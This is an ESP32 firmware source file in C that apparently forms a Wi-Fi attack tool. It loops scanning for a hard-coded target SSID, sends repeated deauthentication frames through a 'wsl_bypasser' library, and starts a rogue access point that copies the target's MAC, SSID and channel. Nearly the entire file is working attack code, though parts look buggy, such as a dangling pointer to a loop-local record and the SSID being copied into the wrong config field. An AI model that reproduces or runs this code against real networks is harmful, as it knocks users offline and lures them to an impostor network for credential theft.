#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "esp_task.h"
#include "esp_log.h"
#include "esp_wifi_types.h"
#include "esp_wifi.h"
#include "wsl_bypasser.h"

#include "esp_timer.h"
#include "nvs_flash.h"

#define MAIN_TAG "WarNeverChanges"
#define TARGET_SSID "Noob_2"
#define MAX_AP 50

typedef struct {
	wifi_ap_record_t ap_record[MAX_AP];
	uint16_t total;
} ap_records_t;

typedef enum {
	AP_OK = 0,
	AP_ERR,
} ap_status_t;

static ap_records_t ap_records;

// Scan Wifi Network and Return array
ap_status_t scan_wifi_networks(ap_records_t *records)
{
	records->total = MAX_AP;
	wifi_scan_config_t scan_config = { .ssid = NULL,
					   .bssid = NULL,
					   .channel = 0,
					   .scan_type = WIFI_SCAN_TYPE_ACTIVE };
	esp_err_t err;
	// Scan for available networks
	err = esp_wifi_scan_start(&scan_config, true);
	if (err != ESP_OK) {
		ESP_ERROR_CHECK(err);
		return AP_ERR;
	}
	esp_wifi_scan_get_ap_records(&records->total, records->ap_record);
	if (err != ESP_OK) {
		ESP_ERROR_CHECK(err);
		return AP_ERR;
	}
	esp_wifi_scan_stop();
	if (err != ESP_OK) {
		ESP_ERROR_CHECK(err);
		return AP_ERR;
	}
	return AP_OK;
}

// this is needed to register as event handler
void wifi_event_handler(void *event_handler_arg, esp_event_base_t event_base,
			int32_t event_id, void *event_data)
{
}

static void timer_send_deauth_frame(void *arg)
{
	ESP_LOGI(MAIN_TAG, "Sent 50 %s", ((wifi_ap_record_t *)arg)->ssid);
	wsl_send_multiple_deauth_frames((wifi_ap_record_t *)arg, 50, 10);
}

static esp_timer_handle_t deauth_timer_handle;

static const int period_sec = 1;

#define TAG "WIFI_CONTROL"

void attack_method_rogueap(const wifi_ap_record_t *ap_record)
{
	ESP_LOGI(TAG, "Configuring Rogue AP");
	esp_wifi_set_mac(WIFI_IF_AP, ap_record->bssid);
	wifi_config_t ap_config = {
		.ap = { .ssid_len = strlen((char *)ap_record->ssid),
			.channel = ap_record->primary,
			.authmode = ap_record->authmode,
			.password = "dummypassword",
			.max_connection = 1 },
	};
	mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);

	ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));
	ESP_LOGI(TAG, "AP started with SSID=%s", ap_config.ap.ssid);
}

void app_main(void)
{
	esp_err_t err;
	ESP_LOGE(MAIN_TAG, "Boot up!");

	// create default event loop
	ESP_ERROR_CHECK(esp_event_loop_create_default());

	// Initialize NVS.
	err = nvs_flash_init();
	if (err == ESP_ERR_NVS_NO_FREE_PAGES ||
	    err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
		ESP_ERROR_CHECK(nvs_flash_erase());
		err = nvs_flash_init();
	}
	ESP_ERROR_CHECK(err);

	// Initialize Wifi
	wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
	err = esp_wifi_init(&cfg);
	ESP_ERROR_CHECK(err);

	err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
	ESP_ERROR_CHECK(err);

	err = esp_wifi_set_mode(WIFI_MODE_APSTA);
	ESP_ERROR_CHECK(err);

	err = esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
					 &wifi_event_handler, NULL);
	ESP_ERROR_CHECK(err);

	wifi_country_t country = {
		.cc = "CN",
		.schan = 1,
		.nchan = 13,
		.max_tx_power = 20,
		.policy = WIFI_COUNTRY_POLICY_AUTO,
	};

	ESP_ERROR_CHECK(esp_wifi_set_country(&country));

	// Start Wifi
	err = esp_wifi_start();
	ESP_ERROR_CHECK(err);

	ap_status_t status;

	// Create a task that will scan for Wifi Networks
	for (;;) {
		ESP_LOGE(MAIN_TAG, "Attack Loop!");
		// Delay for 1000ms
		vTaskDelay(1000 / portTICK_PERIOD_MS);

		status = scan_wifi_networks(&ap_records);

		if (status == AP_ERR) {
			ESP_LOGE(MAIN_TAG, "Error scanning for networks");
			vTaskDelay(10000 / portTICK_PERIOD_MS);
		}

		ESP_LOGI(MAIN_TAG, "Total APs: %d", ap_records.total);

		wifi_ap_record_t *target = NULL;
		char *ssidStr = NULL;
		for (int i = 0; i < ap_records.total; i++) {
			wifi_ap_record_t record = ap_records.ap_record[i];
			ssidStr = (char *)record.ssid;
			printf("Trying SSID: %s\n", ssidStr);
			if (strcmp(ssidStr, TARGET_SSID) == 0) {
				target = &record;
				ESP_LOGI(MAIN_TAG, "Found SSID: %s", ssidStr);
				vTaskDelay(500 / portTICK_PERIOD_MS);
				break;
			}
		}

		if (target == NULL) {
			ESP_LOGE(MAIN_TAG, "SSID not found");
			vTaskDelay(1000 / portTICK_PERIOD_MS);
			continue;
		}

		ESP_LOGI(MAIN_TAG, "Start Attack on SSID: %s", ssidStr);
		const esp_timer_create_args_t deauth_timer_args = {
			.callback = &timer_send_deauth_frame,
			.arg = (void *)target
		};
		ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args,
						 &deauth_timer_handle));

		ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle,
							 period_sec * 1000000));

		attack_method_rogueap(target);

		// 10 seconds delay
		vTaskDelay(10000 / portTICK_PERIOD_MS);
		ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
		ESP_LOGI(MAIN_TAG, "Attack on SSID: %s has been stopped",
			 ssidStr);
	}
}
